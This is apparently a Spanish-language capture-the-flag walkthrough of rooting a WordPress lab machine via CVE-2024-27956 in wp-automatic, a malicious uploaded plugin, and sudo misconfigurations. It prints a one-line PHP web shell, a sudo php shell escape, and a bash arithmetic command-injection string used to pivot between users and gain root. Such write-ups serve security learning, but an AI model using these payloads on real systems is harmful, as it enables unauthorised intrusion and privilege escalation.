- Tags: #sqli #wordpress #PluguinWordPress #PHP 
_____
empezamos escaneando la dirección ip con nmap para ver que nos encontramos.

tenemos el puerto 80 abierto, procedemos a escanear el puerto con nmap para conocer el servicio y version que corre por el mismo.
_____
![](attachment/8947fba94a0b0322489c32b545328f24.png)
_____
tenemos una web que parece ser una academia, por lo que utilizando wappalyzer podremos ver que tenemos en la web.
____
![](attachment/c49d4231f30ff47825de7a22ce510837.png)
____
tenemos un wordpress pero listando los plugins instalados no encontramos un vector de taque solido. 

investigando por el código fuente podemos encontrar un posible usuario.
_____
![](attachment/c083915100109b98c54e39599fe9260f.png)
____
por lo que ahora solo nos falta una credencial, pero adelanto que no llegaremos a nada por esta vía.

investigando la pagina encontramos lo siguiente.
_____
![](attachment/934d05160db7b549d193a6bc1dfdd94f.png)
_______
tenemos wp-automatic y una versión, por lo que si investigamos veremos que esa versión está sujeta a una vulnerabilidad en la base de datos, donde nos permite crear un usuario y ademas otorgarle permisos de administrador, de esa forma nos podremos conectar por el panel de login con el usuario recién creado.

la vulnerabilidad es la siguiente: CVE-2024-27956

si buscamos en la web encontraremos exploits automatizados para lograr explotar esta vulnerabilidad. 
_____
![](attachment/49e01a70537721000d609c4be09c480d.png)
_______
tenemos credenciales confirmadas, con esas nuevas credenciales podremos ingresar por el panel de login.
_____
![](attachment/5df060e2058c039e61f09a542c35876a.png)
_____
estamos en el panel de administrador del wordpress y podemos subir plugin por lo que el siguiente paso sera crear un plugin malicioso, subir y activarlo.

para esto nos ayudaremos también de un exploit automatizado que utiliza msfvenom para crear el plugin.

una vez creado el plugin lo subimos, lo activamos y nos colocamos a la escucha con netcat para después dirigirnos a la ruta donde se aloja el plugin y de esa forma deberíamos de ganar acceso a la maquina.
______
![](attachment/6f8462cc0d91134854bcdb43700f4967.png)
_______
![](attachment/0c1201b073a312b0c7198d659d7d7017.png)
______
activamos el plugin
_____
![](attachment/8676d12c11a24c3a47efaaaadc48ea74.png)
_____
el plugin creo un archivo malicioso php que nos permite ejecutar comandos desde la URL 
_____
![](attachment/fc58cee5922faab6c50b3a1371c123c0.png)
_____
el archivo php malicioso dede tener la siguiente estructura.

```php
<?php
	system($_GET['cmd']);
?>
```

esto es lo que nos permite ejecutar los comandos.

ahora enviemos una reverse shell para conectarnos a la maquina.
____
![](attachment/f500c06081973fcbe9e9e25931eec710.png)
___
estamos dentro, aplicamos el tratamiento de la tty y posteriormente aplicaremos reconocimiento del sistema para buscar vectores para la escalada de privilegios.
____
![](attachment/64faf40204ef1a7004ab75555ede2a63.png)
______
tenemos que podemos ejecutar php como el usuario pylon sin proporcionar contraseña.

por lo que escalaremos privilegios de la siguiente forma.

```php
sudo -u pylon php -r "system('/bin/bash');"
```

______
![](attachment/d1b60360840fe550a947c88fe3d2d4bb.png)
_____
somos el usuario pylon, pero si ejecutamos el comando sudo -l nuevamente veremos lo siguiente.
____
![](attachment/057c70c2d668ef36f41d93c0ce4f5193.png)
_____
acá usaremos una técnica explicada por mario en su canal de youtube para pivotar al usuario mario
_____
![](attachment/a97c14ba0483b4d5661929e41292a17d.png)
______
```bash
a[$(bash  >&2)]+1
```

de esta forma pivotamos a mario, por lo que aplicamos nuevamente el comando sudo -l y vemos lo siguiente.
______
![](attachment/e1b4fcd9c542809a9f7f6a6f322882be.png)
______
para obtener root haremos el mismo proceso que hicimos para pivotar al usuario mario.
______
![](attachment/53d56d7d0844d6559c831dd8985e0208.png)
_____
logramos el root.